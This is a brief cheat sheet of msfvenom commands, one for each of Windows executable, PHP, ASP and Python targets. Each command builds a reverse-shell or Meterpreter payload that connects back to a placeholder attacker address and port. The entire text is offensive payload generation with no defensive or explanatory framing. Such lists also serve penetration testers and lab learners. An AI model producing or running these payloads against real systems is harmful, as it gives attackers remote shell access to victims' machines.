Windows

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev\_shell.exe

PHP

msfvenom -p php/meterpreter\_reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php

ASP

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev\_shell.asp

Python

msfvenom -p cmd/unix/reverse\_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev\_shell.py